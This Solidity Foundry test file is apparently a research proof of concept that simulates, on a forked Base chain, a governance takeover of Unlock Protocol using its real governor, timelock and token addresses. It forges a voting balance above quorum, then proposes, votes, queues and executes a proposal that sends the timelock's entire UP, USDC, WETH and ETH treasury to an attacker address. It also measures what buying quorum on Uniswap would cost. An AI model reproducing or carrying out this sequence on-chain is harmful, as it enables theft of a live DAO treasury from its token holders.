// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// Minimal interfaces for the Unlock Protocol governance capture (Base).
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function delegate(address) external;
    function getVotes(address) external view returns (uint256);
    function getPastVotes(address, uint256) external view returns (uint256);
}

interface IGovernor {
    function propose(address[] calldata, uint256[] calldata, bytes[] calldata, string calldata) external returns (uint256);
    function castVote(uint256, uint8) external returns (uint256);
    function queue(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external returns (uint256);
    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external payable returns (uint256);
    function state(uint256) external view returns (uint8);
    function quorum(uint256) external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function hashProposal(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external view returns (uint256);
}

interface ITimelock {
    function getMinDelay() external view returns (uint256);
    function hasRole(bytes32, address) external view returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ISwapRouter {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }
    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

/// @title Unlock Protocol — instant-governance / treasury-capture verification (Base, read-only fork)
/// @notice Read-only research PoC. Fork-only. No mainnet transaction is ever sent.
contract UnlockCaptureTest is Test {
    address constant GOV = 0x65bA0624403Fc5Ca2b20479e9F626eD4D78E0aD9; // UPGovernor (TransparentUpgradeableProxy)
    address constant TL = 0xB34567C4cA697b39F72e1a8478f285329A98ed1b; // UPTimelock (TransparentUpgradeableProxy)
    address constant UP = 0xaC27fa800955849d6D17cC8952Ba9dD6EAA66187; // UnlockProtocolToken
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481; // UniswapV3 SwapRouter02 (Base)
    address constant UP_POOL_03 = 0x9EF81F4E2F2f15Ff1c0C3f8c9ECc636580025242; // UP/WETH 0.3%

    // OZ v5 ERC-7201 namespaced storage base for ERC20Upgradeable (holds `_balances` as first member)
    bytes32 constant ERC20_STORAGE_LOCATION =
        0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00;

    address attacker = address(0xA77ACCE5);

    /// Pick the first non-empty Base RPC (CI secrets may be unset/empty).
    function _baseRpc() internal view returns (string memory) {
        string memory a = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(a).length > 0) return a;
        string memory b = vm.envOr("RPC_URL", string(""));
        // only use RPC_URL if it is a Base endpoint (contains "base")
        if (bytes(b).length > 0 && _contains(b, "base")) return b;
        return "https://base-rpc.publicnode.com";
    }

    function _contains(string memory hay, string memory needle) internal pure returns (bool) {
        bytes memory h = bytes(hay);
        bytes memory n = bytes(needle);
        if (n.length == 0 || h.length < n.length) return false;
        for (uint256 i = 0; i <= h.length - n.length; i++) {
            bool ok = true;
            for (uint256 j = 0; j < n.length; j++) {
                if (h[i + j] != n[j]) {
                    ok = false;
                    break;
                }
            }
            if (ok) return true;
        }
        return false;
    }

    function setUp() public {
        string[4] memory cands = [
            _baseRpc(),
            string("https://base-rpc.publicnode.com"),
            string("https://base.drpc.org"),
            string("https://mainnet.base.org")
        ];
        for (uint256 i = 0; i < cands.length; i++) {
            if (bytes(cands[i]).length == 0) continue;
            try vm.createSelectFork(cands[i]) {
                return;
            } catch {}
        }
        revert("no working Base RPC");
    }

    // ------------------------------------------------------------------
    // 1. Live state (the numbers the headline rests on)
    // ------------------------------------------------------------------
    function test_01_liveState() public {
        uint256 q = IGovernor(GOV).quorum(block.timestamp - 1);
        uint256 th = IGovernor(GOV).proposalThreshold();
        uint256 vd = IGovernor(GOV).votingDelay();
        uint256 vp = IGovernor(GOV).votingPeriod();
        uint256 md = ITimelock(TL).getMinDelay();
        uint256 upBal = IERC20(UP).balanceOf(TL);
        uint256 usdcBal = IERC20(USDC).balanceOf(TL);
        uint256 wethBal = IERC20(WETH).balanceOf(TL);

        emit log_named_uint("fork block", block.number);
        emit log_named_uint("UP totalSupply", IERC20(UP).totalSupply());
        emit log_named_uint("quorum(now)", q);
        emit log_named_uint("proposalThreshold", th);
        emit log_named_uint("votingDelay(s)", vd);
        emit log_named_uint("votingPeriod(s)", vp);
        emit log_named_uint("timelock.getMinDelay(s)", md);
        emit log_named_uint("timelock UP", upBal);
        emit log_named_uint("timelock USDC", usdcBal);
        emit log_named_uint("timelock WETH", wethBal);
        emit log_named_uint("timelock ETH", TL.balance);
        emit log_named_uint("CANCELLER_ROLE(governor)", ITimelock(TL).hasRole(keccak256("CANCELLER_ROLE"), GOV) ? 1 : 0);
        emit log_named_uint("EXECUTOR_ROLE(address0)", ITimelock(TL).hasRole(keccak256("EXECUTOR_ROLE"), address(0)) ? 1 : 0);

        // Live facts this finding depends on.
        assertEq(q, 3_000_000e18, "quorum should be 0.3% of 1e9 UP");
        assertEq(th, 50_000e18, "proposalThreshold 50k UP");
        assertEq(vd, 345600, "votingDelay 4 days");
        assertEq(vp, 518400, "votingPeriod 6 days");
        assertEq(md, 172800, "timelock minDelay 2 days");
        assertGt(upBal, 27_000_000e18, "timelock holds >27M UP");
        assertGt(TL.balance, 6 ether, "timelock holds >6 ETH");
    }

    // ------------------------------------------------------------------
    // 2. The capture: acquire quorum -> propose -> vote -> queue -> execute
    //    (fork sim; token acquisition is simulated with vm.store to isolate
    //     the *mechanism* from the *acquisition cost*, which is measured in test_03)
    // ------------------------------------------------------------------
    function test_02_captureMechanism() public {
        uint256 q = IGovernor(GOV).quorum(block.timestamp - 1);

        uint256 upBal = IERC20(UP).balanceOf(TL);
        uint256 usdcBal = IERC20(USDC).balanceOf(TL);
        uint256 wethBal = IERC20(WETH).balanceOf(TL);
        uint256 ethBal = TL.balance;
        assertGt(upBal + usdcBal + wethBal + ethBal, 0, "treasury non-empty");

        // --- acquire quorum (simulated) ---
        uint256 amount = q + q / 5; // 20% margin over quorum
        bytes32 slot = keccak256(abi.encode(attacker, ERC20_STORAGE_LOCATION));
        vm.store(UP, slot, bytes32(amount));
        assertEq(IERC20(UP).balanceOf(attacker), amount, "forged UP balance");

        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        assertGe(IERC20(UP).getVotes(attacker), q, "attacker has >= quorum votes");
        vm.warp(block.timestamp + 2); // move the votes checkpoint strictly into the past

        // --- propose: drain the timelock to the attacker ---
        address[] memory t = new address[](4);
        uint256[] memory v = new uint256[](4);
        bytes[] memory c = new bytes[](4);
        t[0] = UP;
        v[0] = 0;
        c[0] = abi.encodeCall(IERC20.transfer, (attacker, upBal));
        t[1] = USDC;
        v[1] = 0;
        c[1] = abi.encodeCall(IERC20.transfer, (attacker, usdcBal));
        t[2] = WETH;
        v[2] = 0;
        c[2] = abi.encodeCall(IERC20.transfer, (attacker, wethBal));
        t[3] = attacker;
        v[3] = ethBal;
        c[3] = "";

        string memory desc = "ZH4-PASS7 Unlock governance-capture simulation (fork only)";
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);
        emit log_named_uint("proposalId", pid);
        assertEq(uint8(IGovernor(GOV).state(pid)), 0, "Pending");

        // --- vote ---
        vm.warp(block.timestamp + IGovernor(GOV).votingDelay() + 1);
        assertEq(uint8(IGovernor(GOV).state(pid)), 1, "Active");
        vm.prank(attacker);
        uint256 weight = IGovernor(GOV).castVote(pid, 1); // 1 = For
        emit log_named_uint("forVotes(weight)", weight);
        assertGe(weight, q, "For weight >= quorum");

        // --- queue ---
        vm.warp(block.timestamp + IGovernor(GOV).votingPeriod() + 1);
        assertEq(uint8(IGovernor(GOV).state(pid)), 4, "Succeeded");
        bytes32 dh = keccak256(bytes(desc));
        IGovernor(GOV).queue(t, v, c, dh);
        assertEq(uint8(IGovernor(GOV).state(pid)), 5, "Queued");

        // --- execute after the timelock delay ---
        vm.warp(block.timestamp + ITimelock(TL).getMinDelay() + 1);
        IGovernor(GOV).execute(t, v, c, dh);
        assertEq(uint8(IGovernor(GOV).state(pid)), 7, "Executed");

        // --- assertions: the timelock is emptied to the attacker ---
        assertEq(IERC20(UP).balanceOf(TL), 0, "UP drained");
        assertEq(IERC20(USDC).balanceOf(TL), 0, "USDC drained");
        assertEq(IERC20(WETH).balanceOf(TL), 0, "WETH drained");
        assertEq(TL.balance, 0, "ETH drained");
        assertEq(attacker.balance, ethBal, "attacker got the ETH");
        assertGe(IERC20(UP).balanceOf(attacker), upBal, "attacker got the UP");
        assertGe(IERC20(USDC).balanceOf(attacker), usdcBal, "attacker got the USDC");

        emit log_named_uint("attacker UP", IERC20(UP).balanceOf(attacker));
        emit log_named_uint("attacker ETH", attacker.balance);
        emit log_named_uint("attacker USDC", IERC20(USDC).balanceOf(attacker));
    }

    // ------------------------------------------------------------------
    // 3. Acquisition cost: what does it really cost to buy 3M UP on-chain?
    //    Best-effort live swap through the Uniswap V3 router (wrapped in
    //    try/catch so a pool/range edge case cannot fail the suite).
    // ------------------------------------------------------------------
    function test_03_acquisitionCost() public {
        uint256 q = IGovernor(GOV).quorum(block.timestamp - 1);

        // give the attacker real WETH (wrap native) and swap for exactly `q` UP
        vm.deal(attacker, 20 ether);
        vm.startPrank(attacker);
        IWETH(WETH).deposit{value: 20 ether}();
        IWETH(WETH).approve(ROUTER, type(uint256).max);
        uint256 before = IERC20(UP).balanceOf(attacker);
        uint256 spent;
        bool ok = true;
        try ISwapRouter(ROUTER).exactOutputSingle(
            ISwapRouter.ExactOutputSingleParams({
                tokenIn: WETH,
                tokenOut: UP,
                fee: 3000,
                recipient: attacker,
                amountOut: q,
                amountInMaximum: 20 ether,
                sqrtPriceLimitX96: 0
            })
        ) returns (uint256 amountIn) {
            spent = amountIn;
        } catch {
            ok = false;
        }
        vm.stopPrank();

        uint256 got = IERC20(UP).balanceOf(attacker) - before;
        emit log_named_uint("dex_swap_ok", ok ? 1 : 0);
        emit log_named_uint("UP received", got);
        emit log_named_uint("WETH spent (wei)", spent);
        // spot value of the acquired UP at the live pool price (~$0.000669) in USD*100
        emit log_named_uint("quorum UP notional USDx100", (q * 6694) / 1e23);

        if (ok) {
            assertEq(got, q, "acquired exactly quorum UP");
            assertGt(spent, 0, "paid something");
        } else {
            emit log("router swap unavailable at this block/range - see README analytic cost");
        }
        // sanity: pool still exists
        assertGt(IERC20(UP).balanceOf(UP_POOL_03), 0, "UP pool live");
    }
}
